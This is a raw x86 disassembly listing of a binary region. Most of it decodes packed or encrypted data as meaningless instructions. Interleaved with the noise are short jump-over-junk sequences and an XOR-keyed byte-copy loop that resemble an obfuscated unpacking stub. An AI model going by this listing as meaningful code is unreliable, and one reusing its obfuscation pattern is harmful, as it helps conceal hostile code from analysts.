  405990:	mov    ds:0x95c639ec,al
  405995:	or     DWORD PTR [ebp-0x5a00d8f0],edi
  40599b:	call   0x4c4c:0x514503d1
  4059a2:	sbb    eax,0xa7e664d0
  4059a7:	nop
  4059a8:	mov    esi,0xa37d29b2
  4059ad:	cmc    
  4059ae:	out    dx,eax
  4059af:	leave  
  4059b0:	ins    BYTE PTR es:[edi],dx
  4059b1:	in     al,dx
  4059b2:	(bad)  
  4059b3:	int    0xd6
  4059b5:	jbe    0x4059c5
  4059b7:	pop    edi
  4059b8:	and    BYTE PTR [ebx],0x51
  4059bb:	sbb    bh,BYTE PTR [eax+ebx*1]
  4059be:	pop    ss
  4059bf:	push   cs
  4059c0:	inc    edx
  4059c1:	into   
  4059c2:	inc    esp
  4059c3:	jns    0x40595f
  4059c5:	dec    edx
  4059c6:	xor    ch,BYTE PTR [ebx-0x68]
  4059c9:	inc    ebp
  4059ca:	mov    esp,0x5f2a3400
  4059cf:	in     al,dx
  4059d0:	pop    ecx
  4059d1:	aaa    
  4059d2:	scas   eax,DWORD PTR es:[edi]
  4059d3:	sub    DWORD PTR [edi],eax
  4059d5:	cmp    eax,0x38f0de93
  4059da:	mov    cl,0xa5
  4059dc:	jge    0x405a4a
  4059de:	aam    0xae
  4059e0:	xchg   edx,eax
  4059e1:	addr16 mov al,ds:0x2c81
  4059e5:	and    al,0x29
  4059e7:	push   esi
  4059e8:	jno    0x40596c
  4059ea:	adc    esi,esi
  4059ec:	inc    BYTE PTR [edx]
  4059ee:	jg     0x405a2b
  4059f0:	clc    
  4059f1:	push   eax
  4059f2:	push   ebx
  4059f3:	fiadd  WORD PTR ss:[edx]
  4059f6:	and    edx,esi
  4059f8:	lahf   
  4059f9:	(bad)  
  4059fa:	cmp    BYTE PTR [edx],dh
  4059fc:	mov    cl,0x2a
  4059fe:	jg     0x405a1d
  405a00:	push   es
  405a01:	pop    ecx
  405a02:	(bad)  
  405a03:	aad    0x4d
  405a05:	in     al,dx
  405a06:	out    dx,eax
  405a07:	mov    BYTE PTR [ebx-0x330be480],ch
  405a0d:	xchg   ebx,eax
  405a0e:	dec    eax
  405a0f:	lock ins BYTE PTR es:[edi],dx
  405a11:	ror    BYTE PTR [ebx+edx*8],0xaf
  405a15:	imul   ecx,DWORD PTR [edx+0x9068e73],0x9e1d4e81
  405a1f:	les    eax,FWORD PTR [edi]
  405a21:	or     dh,BYTE PTR [ebx+0x3]
  405a24:	sti    
  405a25:	jl     0x4059d0
  405a27:	jg     0x405aa0
  405a29:	(bad)  [eax+eiz*1]
  405a2c:	bound  eax,QWORD PTR [eax+0x437b7d12]
  405a32:	adc    eax,0xe4abf229
  405a37:	jg     0x4059fe
  405a39:	in     eax,dx
  405a3a:	clc    
  405a3b:	les    edi,FWORD PTR [edi+0x51]
  405a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a3f:	pop    ebp
  405a40:	sbb    eax,0xeca8d940
  405a45:	int3   
  405a46:	(bad)  
  405a47:	xchg   esi,eax
  405a48:	ret    
  405a49:	xchg   edx,eax
  405a4a:	mov    BYTE PTR [edx+0x2a],0xe1
  405a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a4f:	test   eax,0x29d098c4
  405a54:	les    esp,FWORD PTR fs:[ecx+0x6f]
  405a58:	jge    0x405ac3
  405a5a:	pop    ebx
  405a5b:	adc    al,0xc3
  405a5d:	dec    ebx
  405a5e:	bound  esi,QWORD PTR [eax+0x144b46b5]
  405a64:	mov    dl,0x98
  405a66:	push   edx
  405a67:	loop   0x405a69
  405a69:	jecxz  0x405a94
  405a6b:	dec    eax
  405a6c:	mov    ecx,ebx
  405a6e:	arpl   WORD PTR [edx],bx
  405a70:	xchg   ecx,eax
  405a71:	mov    ch,0x70
  405a73:	mov    eax,0x7efb0a5
  405a78:	push   es
  405a79:	mov    WORD PTR [edi],?
  405a7b:	push   0xc38c7089
  405a80:	aas    
  405a81:	jae    0x405afe
  405a83:	jns    0xa7daa8c3
  405a89:	lods   al,BYTE PTR ds:[esi]
  405a8a:	push   edi
  405a8b:	jno    0x405acc
  405a8d:	xchg   esp,eax
  405a8e:	(bad)  
  405a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a90:	outs   dx,DWORD PTR ds:[esi]
  405a91:	rcr    BYTE PTR [edi],0xe4
  405a94:	(bad)  
  405a95:	adc    edx,DWORD PTR [ebx]
  405a97:	cdq    
  405a98:	inc    esi
  405a99:	leave  
  405a9a:	push   ss
  405a9b:	push   eax
  405a9c:	adc    eax,0xb9469bc7
  405aa1:	mov    bh,0xa0
  405aa3:	adc    DWORD PTR [edx+0x1a],edi
  405aa6:	mov    ecx,DWORD PTR [esi-0x51bb1aea]
  405aac:	(bad)  
  405aad:	ficom  DWORD PTR [edx+0x400db138]
  405ab3:	repnz inc ebp
  405ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ab6:	nop
  405ab7:	adc    al,0x68
  405ab9:	out    0x21,eax
  405abb:	cld    
  405abc:	xchg   edi,eax
  405abd:	jp     0x405b12
  405abf:	mov    ds:0x1e53b0f3,eax
  405ac4:	sti    
  405ac5:	jno    0x405a5d
  405ac7:	scas   al,BYTE PTR es:[edi]
  405ac8:	adc    DWORD PTR [ecx+0x70],edx
  405acb:	push   0xffffffd4
  405acd:	jle    0x405a51
  405acf:	xor    cl,bh
  405ad1:	mov    ds:0xd3ec856e,al
  405ad6:	nop
  405ad7:	push   ebp
  405ad8:	add    eax,ecx
  405ada:	dec    ebx
  405adb:	lea    ebp,[edx+0x35]
  405ade:	xchg   ebp,eax
  405adf:	test   DWORD PTR [ecx],ecx
  405ae1:	push   ebx
  405ae2:	jns    0x405b4d
  405ae4:	mov    ebp,0x3c675b50
  405ae9:	aad    0xb0
  405aeb:	(bad)  
  405aed:	dec    eax
  405aee:	push   ss
  405aef:	mov    ebp,0x1bae97f3
  405af4:	mov    bh,0x2a
  405af6:	push   cs
  405af7:	mov    bl,0xf2
  405af9:	adc    edx,edx
  405afb:	outs   dx,DWORD PTR ds:[esi]
  405afc:	sbb    al,0xd5
  405afe:	jae    0x405b44
  405b00:	and    eax,0x787985ed
  405b05:	xchg   BYTE PTR ss:[edi-0x6c],ch
  405b09:	mov    ecx,eax
  405b0b:	mov    esi,0xf3485a38
  405b10:	xlat   BYTE PTR ds:[ebx]
  405b11:	jno    0x405b33
  405b13:	idiv   eax
  405b15:	inc    ecx
  405b16:	xor    eax,0x3e17ce1a
  405b1b:	push   esi
  405b1c:	jmp    0xae5e773a
  405b21:	stc    
  405b22:	and    al,0xcb
  405b24:	bound  esi,QWORD PTR [ebx-0x1]
  405b27:	and    al,0x23
  405b29:	out    dx,al
  405b2a:	call   0x17f3:0x88661e63
  405b31:	int3   
  405b32:	dec    eax
  405b33:	sbb    DWORD PTR [esi+0x10],0xfffffff1
  405b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b38:	push   esi
  405b39:	(bad)  
  405b3b:	cmp    ecx,edx
  405b3d:	inc    ebx
  405b3e:	mov    dh,0x7c
  405b40:	jne    0x405ade
  405b42:	jbe    0x405ac7
  405b44:	push   edi
  405b45:	movaps xmm2,xmm1
  405b48:	and    eax,0xfae3512a
  405b4d:	xor    ebp,DWORD PTR [ecx]
  405b4f:	loope  0x405b9b
  405b51:	jnp    0x405bb9
  405b53:	jno    0x405af4
  405b55:	adc    eax,0xad366ac0
  405b5a:	stos   DWORD PTR es:[edi],eax
  405b5b:	neg    al
  405b5d:	add    esi,DWORD PTR [ebx-0x5b284c88]
  405b63:	jns    0x405b45
  405b65:	pop    eax
  405b66:	scas   al,BYTE PTR es:[edi]
  405b67:	sub    bl,BYTE PTR [eax-0x77]
  405b6a:	test   DWORD PTR [edi+0x4b],ebx
  405b6d:	out    0xef,eax
  405b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b70:	inc    edx
  405b71:	jb     0x405b4b
  405b73:	inc    ecx
  405b74:	(bad)  
  405b75:	aas    
  405b76:	in     eax,0x9b
  405b78:	or     DWORD PTR [edi+0x77],ecx
  405b7b:	ja     0x405bbd
  405b7d:	jns    0x405be2
  405b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b80:	fidiv  DWORD PTR [esp+eiz*8]
  405b83:	(bad)  
  405b84:	mov    edx,0x33e0a7b5
  405b89:	xchg   BYTE PTR [esi],dl
  405b8b:	sahf   
  405b8c:	loopne 0x405bf8
  405b8e:	shl    DWORD PTR [esi+0x29],1
  405b91:	mov    esp,0x46fd6e73
  405b96:	or     eax,0xe56d7e3a
  405b9b:	aam    0xf0
  405b9d:	jecxz  0x405bc0
  405b9f:	sub    al,0x3b
  405ba1:	pop    edi
  405ba2:	dec    ebp
  405ba3:	cmc    
  405ba4:	sub    BYTE PTR [ecx+eax*8-0x44],ah
  405ba8:	nop
  405ba9:	xchg   ecx,eax
  405baa:	sar    DWORD PTR [ebx-0x264885ea],1
  405bb0:	(bad)  
  405bb1:	lods   al,BYTE PTR ds:[esi]
  405bb2:	out    dx,eax
  405bb3:	jmp    0x405b3f
  405bb5:	ss inc esp
  405bb7:	imul   ecx,DWORD PTR ds:0xcc3b0076,0xb107aa22
  405bc1:	sub    esi,DWORD PTR [ecx-0x76]
  405bc4:	sbb    ecx,ecx
  405bc6:	jge    0x405bfd
  405bc8:	xchg   ebx,eax
  405bc9:	sbb    al,0x8d
  405bcb:	call   0x8a6:0xfae1ee1
  405bd2:	or     al,0x54
  405bd5:	mov    dh,0xd1
  405bd7:	fwait
  405bd8:	popf   
  405bd9:	add    ecx,DWORD PTR [edx+edx*2]
  405bdc:	(bad)  
  405bdd:	rol    BYTE PTR [eax+0x6935df06],1
  405be3:	stc    
  405be4:	(bad)  
  405be5:	daa    
  405be6:	aad    0x65
  405be8:	popa   
  405be9:	dec    ebx
  405bea:	imul   esp,DWORD PTR ds:0xa411387,0xfffffff3
  405bf1:	xchg   edi,eax
  405bf2:	ret    
  405bf3:	and    ebx,DWORD PTR [ecx+0x4b06d5d6]
  405bf9:	mov    ecx,0x4125d1a2
  405bfe:	or     ebp,eax
  405c00:	das    
  405c01:	repnz dec esp
  405c03:	mov    al,ds:0x8d0ec0b2
  405c08:	adc    edi,ebp
  405c0a:	mov    ds:0x9e65d06a,al
  405c0f:	sub    edi,eax
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0xd95d0ed0,dx
  405c45:	sbb    bl,dl
  405c47:	fist   DWORD PTR [eax+0x3b]
  405c4a:	jle    0x405cca
  405c4c:	mov    ebp,0x1c7e7e71
  405c51:	mov    ?,eax
  405c53:	jmp    0x405bef
  405c55:	add    ebp,edx
  405c57:	push   edi
  405c58:	repz fs retf 0xc70c
  405c5d:	jbe    0x405c93
  405c5f:	and    al,0x18
  405c61:	test   eax,0xd630f835
  405c66:	jmp    0x405bfb
  405c68:	bnd jge 0x405c93
  405c6b:	loopne 0x405ca3
  405c6d:	xor    eax,0xa5e1c853
  405c72:	(bad)  
  405c73:	clc    
  405c74:	sbb    bh,BYTE PTR [ecx-0x544c35f7]
  405c7a:	add    ah,dl
  405c7c:	dec    ecx
  405c7d:	xchg   ebp,eax
  405c7e:	mov    ebx,0xf5237f4
  405c83:	in     eax,dx
  405c84:	lds    edi,FWORD PTR [ebx]
  405c86:	retf   
  405c87:	popf   
  405c88:	xlat   BYTE PTR ds:[ebx]
  405c89:	and    al,0x60
  405c8b:	imul   esp,DWORD PTR [ebp+0x65],0xffffff99
  405c8f:	pop    edi
  405c90:	jbe    0x405c9c
  405c92:	or     eax,0x33aa65c
  405c98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c99:	or     eax,0x5a6b0ff9
  405c9e:	int    0xf
  405ca0:	in     al,0x69
  405ca2:	sub    eax,0xc25c79b5
  405ca7:	xlat   BYTE PTR ds:[ebx]
  405ca8:	(bad)  
  405ca9:	sti    
  405caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cab:	clc    
  405cac:	sbb    eax,0xd1867953
  405cb1:	pop    edx
  405cb2:	dec    eax
  405cb3:	sub    bh,BYTE PTR [esi+edi*2-0x32]
  405cb7:	dec    ecx
  405cb8:	mov    ebp,0xf3bac097
  405cbd:	jmp    0x405cb0
  405cbf:	adc    al,0xfa
  405cc1:	retf   0xc6de
  405cc4:	sbb    eax,0x7632b1b8
  405cc9:	and    eax,0xe6a52532
  405cce:	ds pop ss
  405cd0:	lods   eax,DWORD PTR ds:[esi]
  405cd1:	inc    dx
  405cd3:	add    dh,BYTE PTR [ebx+0x69]
  405cd6:	shl    BYTE PTR [ebx-0x35c8186],1
  405cdc:	(bad)  
  405cdd:	(bad)  
  405ce0:	dec    ebx
  405ce1:	push   ecx
  405ce2:	dec    edx
  405ce3:	mov    esi,es
  405ce5:	or     al,0x35
  405ce7:	loope  0x405d5f
  405ce9:	jg     0x405cfc
  405ceb:	(bad)  
  405ced:	sti    
  405cee:	push   ecx
  405cef:	mov    al,0x54
  405cf1:	popa   
  405cf2:	xchg   edx,eax
  405cf3:	nop
  405cf4:	ds repz xchg ebp,eax
  405cf7:	or     cl,BYTE PTR [eax]
  405cf9:	and    edx,DWORD PTR [ecx-0x10]
  405cfc:	stos   BYTE PTR es:[edi],al
  405cfd:	outs   dx,DWORD PTR ds:[esi]
  405cfe:	sub    BYTE PTR [eax],ch
  405d00:	je     0x405cbc
  405d02:	stos   BYTE PTR es:[edi],al
  405d03:	add    bh,BYTE PTR [eax+0x70]
  405d06:	lahf   
  405d07:	pop    ds
  405d08:	push   eax
  405d09:	cmp    BYTE PTR [edx+0x7accdd7f],0xba
  405d10:	sar    DWORD PTR [edi-0x46],1
  405d13:	nop
  405d14:	jae    0x405cf6
  405d16:	les    eax,FWORD PTR [edx-0x74b8887]
  405d1c:	pop    es
  405d1d:	jnp    0x405cc8
  405d1f:	sub    BYTE PTR [ecx+0x59],dh
  405d22:	push   ecx
  405d23:	xchg   ebx,eax
  405d24:	dec    edx
  405d25:	sub    DWORD PTR [esi-0x7cf3e395],0x19b9b6a4
  405d2f:	(bad)  
  405d30:	add    al,0xd1
  405d32:	add    dh,BYTE PTR [esi+0x17]
  405d35:	in     eax,0x66
  405d37:	popa   
  405d38:	icebp  
  405d39:	adc    esi,edx
  405d3b:	xor    edi,ecx
  405d3d:	sub    eax,0x1a22cba3
  405d42:	add    BYTE PTR [eax+0x59],ah
  405d45:	iret   
  405d46:	repnz pop esi
  405d48:	or     DWORD PTR [ecx-0x65],ebp
  405d4b:	pusha  
  405d4c:	outs   dx,BYTE PTR ds:[esi]
  405d4d:	and    BYTE PTR [eax+0x4b],al
  405d50:	das    
  405d51:	sub    cl,BYTE PTR [ebp+0x195b199f]
  405d57:	mov    bh,BYTE PTR ds:0xc5c83189
  405d5d:	cmc    
  405d5e:	fist   DWORD PTR [ebp-0x90ccf5f]
  405d64:	test   eax,0x6682a251
  405d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d6a:	js     0x405d61
  405d6c:	jnp    0x405d13
  405d6e:	nop
  405d6f:	add    BYTE PTR [eax-0x547f8b58],0x11
  405d76:	xchg   edx,eax
  405d77:	mov    eax,0xb7d20256
  405d7c:	push   ecx
  405d7d:	and    eax,0x10ace8dd
  405d82:	xchg   DWORD PTR [ebp-0x22f1094e],ebp
  405d88:	jnp    0x405d3b
  405d8a:	cwde   
  405d8b:	sub    eax,0x983d7b04
  405d90:	inc    edi
  405d91:	pusha  
  405d92:	jp     0x405dce
  405d94:	push   es
  405d95:	jbe    0x405dfb
  405d97:	xchg   esp,eax
  405d98:	or     dl,ch
  405d9a:	push   eax
  405d9b:	scas   eax,DWORD PTR es:[edi]
  405d9c:	xchg   esp,eax
  405d9d:	std    
  405d9e:	adc    eax,0xf0baba85
  405da3:	loopne 0x405ddb
  405da5:	sbb    dh,cl
  405da7:	repnz mov eax,ds:0xa85fcb2
  405dad:	scas   eax,DWORD PTR es:[edi]
  405dae:	xor    eax,0x8e280389
  405db3:	mov    dl,0xbd
  405db5:	mov    dh,0x52
  405db7:	fild   WORD PTR ds:[esi+0x6f]
  405dbb:	pop    ecx
  405dbc:	test   DWORD PTR [esi],ebx
  405dbe:	loop   0x405dd3
  405dc0:	xchg   edx,eax
  405dc1:	aaa    
  405dc2:	cwde   
  405dc3:	sbb    DWORD PTR [ecx+0x4d04e015],ebx
  405dc9:	nop
  405dca:	mov    al,ds:0x77402aaa
  405dcf:	dec    ebx
  405dd0:	or     ebp,esp
  405dd2:	fld    QWORD PTR ds:0x5dec6428
  405dd8:	inc    edi
  405dd9:	inc    esp
  405dda:	cmp    DWORD PTR [edx],0x4e2b0a48
  405de0:	fimul  WORD PTR [edi+0x5734b41f]
  405de6:	int    0x5d
  405de8:	add    dh,BYTE PTR [eax-0x5fff9a1f]
  405dee:	jle    0x405dcc
  405df0:	mov    WORD PTR [edi],?
  405df2:	xchg   edi,eax
  405df3:	or     DWORD PTR [ebx+0x543db591],0x6b
  405dfa:	pop    ecx
  405dfb:	jno    0x405e3b
  405dfd:	jecxz  0x405dbb
  405dff:	ficom  DWORD PTR [edx]
  405e01:	out    dx,eax
  405e02:	xchg   esp,eax
  405e03:	ret    0x3743
  405e06:	adc    DWORD PTR [ebx+0x3d],edx
  405e09:	pop    es
  405e0a:	add    eax,DWORD PTR [ebp+0x2f9d9c61]
  405e10:	fstp   QWORD PTR [ebp-0x7b]
  405e13:	repz or BYTE PTR [esi-0x3a23e945],0xee
  405e1b:	xor    eax,0x468fb5fa
  405e20:	andnps xmm6,XMMWORD PTR [esi+0x7]
  405e24:	mov    bl,dl
  405e26:	mov    ah,0xc8
  405e28:	mul    BYTE PTR ds:0x36312c14
  405e2e:	in     eax,dx
  405e2f:	xor    DWORD PTR [ebp+esi*8-0x1f],esp
  405e33:	dec    DWORD PTR [ebp+0x268f42b9]
  405e39:	mov    al,ds:0x555e5474
  405e3e:	pop    ss
  405e3f:	aam    0x7c
  405e41:	sbb    cl,BYTE PTR [eax-0x58048774]
  405e47:	popa   
  405e48:	in     al,dx
  405e49:	imul   esp,DWORD PTR [edi+eax*4-0x23],0xf
  405e4e:	mov    bl,0xb1
  405e50:	call   0xfc67a79
  405e55:	add    al,0xb6
  405e57:	cmp    al,0x4
  405e59:	pop    esp
  405e5a:	data16 mov es,WORD PTR [ebx-0x65d8bd2c]
  405e61:	std    
  405e62:	cmp    eax,0xe97bd4b2
  405e67:	shl    DWORD PTR [esi],0x58
  405e6a:	dec    esi
  405e6b:	aam    0x10
  405e6d:	ins    DWORD PTR es:[edi],dx
  405e6e:	pop    es
  405e6f:	es pop esi
  405e71:	or     edi,edi
  405e73:	or     ah,BYTE PTR fs:[ecx]
  405e76:	xor    DWORD PTR [eax],esp
  405e78:	int3   
  405e79:	scas   eax,DWORD PTR es:[edi]
  405e7a:	mov    ds:0x926afb7b,al
  405e7f:	cwde   
  405e80:	sub    edi,esp
  405e82:	dec    edi
  405e83:	cdq    
  405e84:	dec    esi
  405e85:	outs   dx,DWORD PTR ds:[esi]
  405e86:	adc    al,0xe3
  405e88:	xchg   esi,eax
  405e89:	jmp    0xd4945a23
  405e8e:	push   0xfffffff6
  405e90:	mov    ds:0x8a4bee0a,al
  405e95:	push   edi
  405e96:	inc    ecx
  405e97:	je     0x405f07
  405e99:	inc    edi
  405e9a:	es jp  0x405e75
  405e9d:	and    bh,cl
  405e9f:	cli    
  405ea0:	sbb    eax,0x235cc7ce
  405ea5:	mov    cl,BYTE PTR [edx-0x50c558ff]
  405eab:	or     ecx,ebx
  405ead:	add    al,0xf6
  405eaf:	jbe    0x405e45
  405eb1:	fnstcw WORD PTR [ebp-0x57]
  405eb4:	dec    ebp
  405eb5:	cmp    al,0x85
  405eb8:	push   ss
  405eb9:	repnz pop edi
  405ebb:	gs sub al,al
  405ebe:	pop    esp
  405ebf:	mov    ebx,0xb5c6773e
  405ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ec5:	mov    bl,0x17
  405ec7:	outs   dx,DWORD PTR ds:[esi]
  405ec8:	mov    al,0x4f
  405eca:	imul   edx,edx,0x5
  405ecd:	and    al,0x3
  405ecf:	pop    edi
  405ed0:	leave  
  405ed1:	out    dx,eax
  405ed2:	ins    BYTE PTR es:[edi],dx
  405ed3:	lea    edi,[ebx-0x179cf9d9]
  405ed9:	mov    ebp,0x18f41ccc
  405ede:	std    
  405edf:	stc    
  405ee0:	loope  0x405f08
  405ee2:	pop    ds
  405ee3:	retf   0x84ab
  405ee6:	sub    ah,BYTE PTR [esi+ecx*4]
  405ee9:	xchg   edx,eax
  405eea:	sti    
  405eeb:	bnd jno 0x132c16a3
  405ef2:	dec    ebx
  405ef3:	repnz aaa 
  405ef5:	mov    ecx,0xb9efd960
  405efa:	cmp    eax,0xaf4e5aa5
  405eff:	xchg   edx,eax
  405f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f01:	iret   
  405f02:	add    eax,0xea488dc2
  405f07:	aaa    
  405f08:	nop
  405f09:	dec    esp
  405f0a:	imul   ecx,DWORD PTR [edi],0xa7b473fc
  405f10:	lods   al,BYTE PTR ds:[esi]
  405f11:	cli    
  405f12:	inc    edi
  405f13:	out    0xde,eax
  405f15:	adc    DWORD PTR ds:0x9a462475,0xb274c828
  405f1f:	pop    ebp
  405f20:	iret   
  405f21:	retf   0xf577
  405f24:	data16 cs sahf 
  405f27:	add    ebp,DWORD PTR [ebp+0x47]
  405f2a:	(bad)  
  405f2b:	adc    eax,0x5b22f64b
  405f30:	stos   BYTE PTR es:[edi],al
  405f31:	mov    bl,0x46
  405f33:	sub    eax,0xe3513691
  405f38:	adc    BYTE PTR [esi+0x3c32a430],ch
  405f3e:	shl    DWORD PTR [ebp-0x46439aac],0xde
  405f45:	mov    esi,0x38cc08a9
  405f4a:	loop   0x405f55
  405f4c:	int3   
  405f4d:	pop    esp
  405f4e:	and    dh,BYTE PTR [ecx]
  405f50:	and    DWORD PTR [eax-0xc7b96af],eax
  405f56:	cmovns eax,ebp
  405f59:	test   BYTE PTR [edx],cl
  405f5b:	mov    dl,BYTE PTR [edi]
  405f5d:	cmp    al,0xcd
  405f5f:	out    0xb0,eax
  405f61:	dec    esp
  405f62:	icebp  
  405f63:	mov    cl,BYTE PTR [edi+0x1cf44835]
  405f69:	(bad)  
  405f6b:	cmp    BYTE PTR [ecx-0x49],al
  405f6e:	call   0xdd442c79
  405f73:	mov    ah,0x31
  405f75:	cmp    dl,BYTE PTR [ecx+0x15]
  405f78:	idiv   DWORD PTR [esi]
  405f7a:	test   al,0x40
  405f7c:	jbe    0x405fee
  405f7e:	int    0xf3
  405f80:	sbb    eax,0x59f28d93
  405f85:	mov    ebp,0x89ee0ec8
  405f8a:	popf   
  405f8b:	mov    ecx,0xd9e091c
  405f90:	mov    al,ds:0x5dbc0203
  405f95:	mov    ecx,0x4d6e6dc3
  405f9a:	not    DWORD PTR [edx-0x33]
  405f9d:	js     0x405fa5
  405f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fa0:	std    
  405fa1:	jge    0x405f41
  405fa3:	popf   
  405fa4:	mov    eax,ds:0x8883e8c6
  405fa9:	rcr    BYTE PTR [eax],1
  405fab:	xchg   edx,eax
  405fac:	cmp    esi,DWORD PTR [ebx+0x16]
  405faf:	fcom   DWORD PTR [eax-0x58]
  405fb2:	inc    edi
  405fb3:	push   0x5aebcd4b
  405fb8:	loope  0x405fe7
  405fba:	xor    DWORD PTR [eax-0x502f5147],edi
  405fc0:	dec    esi
  405fc1:	jmp    0x7a199762
  405fc6:	lods   eax,DWORD PTR ds:[esi]
  405fc7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fc9:	or     BYTE PTR [edi-0x65b5523c],dh
  405fcf:	bound  ebx,QWORD PTR [esi]
  405fd1:	rcpps  xmm1,xmm4
  405fd4:	xchg   edi,eax
  405fd5:	dec    ebp
  405fd6:	test   al,0xb1
  405fd8:	daa    
  405fd9:	daa    
  405fda:	and    eax,0xbd881032
  405fdf:	pop    ds
  405fe0:	scas   eax,DWORD PTR es:[edi]
  405fe1:	(bad)  
  405fe2:	(bad)  [edx+ebp*1-0x2a4a70bc]
  405fe9:	sub    DWORD PTR ds:0x50189061,ebx
  405fef:	dec    edi
  405ff0:	mov    al,0x1d
  405ff2:	adc    cl,BYTE PTR [edx+0x2b]
  405ff5:	push   ebp
  405ff6:	out    dx,eax
  405ff7:	adc    edi,eax
  405ff9:	loop   0x406056
  405ffb:	dec    ebp
  405ffc:	push   ebp
  405ffd:	cmp    al,0x28
  405fff:	aad    0x9b
  406001:	retf   
  406002:	js     0x406004
  406004:	cmp    ebx,eax
  406006:	mov    eax,ds:0x634e3f03
  40600b:	scas   al,BYTE PTR es:[edi]
  40600c:	sbb    cl,BYTE PTR [eax+ecx*2]
  40600f:	add    edi,esi
  406011:	mov    esi,DWORD PTR [ebp+0x8]
  406014:	imul   edi,edx
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	cmp    eax,0x9f1d2f33
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0x987e7e71
  406063:	push   es
  406064:	cmp    esp,esp
  406066:	adc    DWORD PTR [eax+0x6384a316],edi
  40606c:	sbb    bl,ch
  40606e:	pop    eax
  40606f:	fld    TBYTE PTR [eax-0x483e7883]
  406075:	inc    edi
  406076:	jbe    0x4060eb
  406078:	cmp    edi,ebx
  40607a:	push   ebp
  40607b:	nop
  40607c:	jecxz  0x406098
  40607e:	rcl    BYTE PTR [edx-0x6a517adc],cl
  406084:	fwait
  406085:	aaa    
  406086:	(bad)  
  406088:	dec    edi
  406089:	or     dl,BYTE PTR [edi]
  40608b:	pop    ss
  40608c:	pop    ds
  40608d:	bound  eax,QWORD PTR [ebp-0x2a]
  406090:	fstp   QWORD PTR [ebp+0x25]
  406093:	fwait
  406094:	inc    esp
  406095:	xchg   ebx,eax
  406096:	pop    esp
  406097:	out    0xfd,al
  406099:	int    0x2
  40609b:	frstor [edi+0x2096b5c6]
  4060a1:	pop    ds
  4060a2:	mov    dl,0x53
  4060a4:	sbb    edi,DWORD PTR ds:0xc6ff1d90
  4060aa:	cmc    
  4060ab:	loopne 0x40611b
  4060ad:	jp     0x406047
  4060af:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4060b1:	(bad)  
  4060b2:	and    BYTE PTR [ebx+0x40],dh
  4060b5:	sbb    cl,BYTE PTR [eax]
  4060b7:	int    0x6c
  4060b9:	xchg   esp,eax
  4060ba:	fcomi  st,st(7)
  4060bc:	test   DWORD PTR [edi],edi
  4060be:	sbb    cl,BYTE PTR [esi+0x7f055f77]
  4060c4:	std    
  4060c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060c6:	mov    dl,BYTE PTR [edi-0xf921c9e]
  4060cc:	pop    ebp
  4060cd:	mov    WORD PTR es:[ecx-0x35628a4b],gs
  4060d4:	test   al,0xc1
  4060d6:	jle    0x4060b4
  4060d8:	adc    ebp,DWORD PTR [ebx-0x39]
  4060db:	mov    ds:0x760d0beb,eax
  4060e0:	mov    esi,0x6a18ba8a
  4060e5:	sub    di,ax
  4060e8:	test   DWORD PTR [edx-0x16624f2c],eax
  4060ee:	fwait
  4060ef:	adc    al,0x8e
  4060f1:	addr16 retf 
  4060f3:	and    DWORD PTR [edx],0x9c610088
  4060f9:	inc    eax
  4060fa:	inc    ebx
  4060fb:	jle    0x406159
  4060fd:	sub    BYTE PTR [ebp+eiz*4-0x33efe556],0xe5
  406105:	xchg   ecx,eax
  406106:	leave  
  406107:	popa   
  406108:	pop    esi
  406109:	jb     0x4060e6
  40610b:	and    bh,BYTE PTR [ebx+edx*4]
  40610e:	out    dx,al
  40610f:	fwait
  406110:	jle    0x406178
  406112:	add    eax,0xcf944905
  406117:	dec    ebp
  406118:	scas   eax,DWORD PTR es:[edi]
  406119:	fcom   DWORD PTR [edx]
  40611b:	imul   esp,DWORD PTR [ebp+0x6b],0xf7796d37
  406122:	call   0x66cd:0x616b0d77
  406129:	aam    0x10
  40612b:	or     eax,0x2e2f1047
  406130:	icebp  
  406131:	mov    dh,0xfe
  406133:	mov    al,0x24
  406135:	retf   
  406136:	rcl    DWORD PTR [ebx-0x75518d5a],1
  40613c:	sbb    BYTE PTR [eax-0x12],ch
  40613f:	aam    0x33
